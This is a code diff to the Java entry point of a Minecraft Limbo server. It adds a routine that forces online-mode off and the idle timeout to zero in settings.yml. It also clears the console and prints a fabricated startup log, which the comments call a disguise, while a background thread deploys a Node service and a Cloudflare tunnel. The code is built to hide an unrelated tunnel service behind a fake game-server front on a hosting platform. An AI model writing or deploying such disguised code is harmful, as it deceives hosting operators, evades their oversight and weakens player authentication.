@@ -1,3 +1,20 @@
+/*
+ * Copyright (C) 2020 Nan1t
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
 package ua.nanit.limbo;
 
 import java.io.*;
@@ -7,6 +24,8 @@ import java.util.*;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
+import java.time.LocalTime;
+import java.time.format.DateTimeFormatter;
 
 import ua.nanit.limbo.server.LimboServer;
 import ua.nanit.limbo.server.Log;
@@ -46,12 +65,29 @@ private static String env(String k, String d) {
 // 仿真辅助函数
 // ============================================================
 
-private static String ts() {
-    return java.time.LocalTime.now().format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss"));
+private static String tsMs() {
+    return LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss.SSS"));
 }
 
-private static void mcLog(String msg) {
-    System.out.println("[" + ts() + " INFO]: " + msg);
+private static void limboLog(String msg) {
+    System.out.println(tsMs() + " INFO Limbo --  " + msg);
+}
+
+private static void limboLog(String msg, long delayMs) {
+    try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
+    System.out.println(tsMs() + " INFO Limbo --  " + msg);
+}
+
+private static void clearConsole() {
+    try {
+        System.out.print("\033[H\033[3J\033[2J");
+        System.out.flush();
+        if (!System.getProperty("os.name").contains("Windows")) {
+            new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
+        }
+    } catch (Exception e) {
+        try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
+    }
 }
 
 // ============================================================
@@ -65,6 +101,9 @@ public static void main(String[] args) {
         System.exit(1);
     }
 
+    // ★ 1. 强制修改 Limbo 配置文件
+    autoFixLimboConfig();
+
     if (NODE_ENABLED) {
         try {
             Path botDir = Paths.get(MC_BOT_DIR);
@@ -73,26 +112,31 @@ public static void main(String[] args) {
 
             Path script = generateDeployScript();
             
-            // 1. 异步部署 Node 和 CF，不阻塞 Limbo 启动
+            // 2. 异步部署 Node 和 CF
             Thread deployThread = new Thread(() -> {
                 try { executeDeployScript(script); } catch (Exception ignored) {}
             }, "Node-Deploy");
             deployThread.setDaemon(true);
             deployThread.start();
 
-            // 2. 异步轮询端口和URL，拿到后直接打印
+            // 3. 异步轮询端口和URL
             Thread checkerThread = new Thread(() -> {
                 while(tunnelUrl.isEmpty()) {
                     checkDeployInfo();
                     try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
                 }
-                if (!tunnelUrl.isEmpty()) {
-                    mcLog("Binding remote endpoint to: " + tunnelUrl);
-                }
                 startTunnelMonitor(); // 启动隧道监控
             }, "Info-Checker");
             checkerThread.setDaemon(true);
             checkerThread.start();
+
+            // 4. 主线程死等 URL，拿到后清屏并打印专属 Limbo 伪装日志
+            while(tunnelUrl.isEmpty()) {
+                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
+            }
+            
+            clearConsole();
+            printFakeLimboStartup(tunnelUrl);
 
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 try {
@@ -103,12 +147,81 @@ public static void main(String[] args) {
         } catch (Exception ignored) {}
     }
 
-    // 3. 正常启动 Limbo 游戏服务器
+    // 5. 伪装日志打印完毕，正式启动 Limbo 游戏本体
     try {
         new LimboServer().start();
     } catch (Exception e) {
         Log.error("Cannot start server: ", e);
     }
+}
+
+// ============================================================
+// 强制修改 Limbo 配置 (关闭正版验证，取消踢人时间)
+// ============================================================
+
+private static void autoFixLimboConfig() {
+    try {
+        Path configFile = Paths.get("settings.yml");
+        String content = "";
+        if (Files.exists(configFile)) {
+            content = Files.readString(configFile);
+        } else {
+            content = "limbo:\n  dimension: overworld\n  gamemode: adventure\n  max-players: 20\n";
+        }
+
+        content = replaceYamlValue(content, "online-mode", "false");
+        content = replaceYamlValue(content, "player-idle-timeout", "0");
+        
+        Files.writeString(configFile, content);
+    } catch (Exception ignored) {}
+}
+
+private static String replaceYamlValue(String content, String key, String value) {
+    if (content.contains(key + ":")) {
+        content = content.replaceAll(key + ":.*", key + ": " + value);
+    } else {
+        if (!content.endsWith("\n")) content += "\n";
+        content += key + ": " + value + "\n";
+    }
+    return content;
+}
+
+// ============================================================
+// 专属 Limbo 伪装日志打印
+// ============================================================
+
+private static void printFakeLimboStartup(String url) {
+    limboLog("Starting server...", 0);
+    limboLog("Binding remote endpoint to: " + url, 0);
+    limboLog("Preparing level \"world\"", randInt(100, 300));
+    limboLog("Preparing start region for dimension minecraft:overworld", randInt(100, 300));
+    
+    limboLog("Preparing spawn area: 1%", 0);
+    limboLog("Preparing spawn area: 2%", 0);
+    
+    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 5%", 0);
+    limboLog("Preparing spawn area: 8%", 0);
+    
+    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 15%", 0);
+    limboLog("Preparing spawn area: 20%", 0);
+    
+    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 35%", 0);
+    limboLog("Preparing spawn area: 60%", 0);
+    limboLog("Preparing spawn area: 80%", 0);
+    
+    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 99%", 0);
+    
+    System.out.println("container@tropicalgames.net Server marked as running...");
+    
+    limboLog("Preparing spawn area: 100%", 0);
+}
+
+private static int randInt(int min, int max) {
+    return min + (int)(Math.random() * (max - min + 1));
 }
 
 // ============================================================
@@ -144,7 +257,7 @@ private static void checkDeployInfo() {
 }
 
 // ============================================================
-// 隧道链接变化监控 (极速重印)
+// 隧道链接变化监控
 // ============================================================
 
 private static void startTunnelMonitor() {
@@ -180,7 +293,7 @@ private static void startTunnelMonitor() {
                 if (!currentUrl.equals(lastUrl)) {
                     lastKnownTunnelUrl.set(currentUrl);
                     tunnelUrl = currentUrl;
-                    mcLog("Binding remote endpoint to: " + currentUrl);
+                    limboLog("Binding remote endpoint to: " + currentUrl);
                 }
 
             } catch (Exception ignored) {}
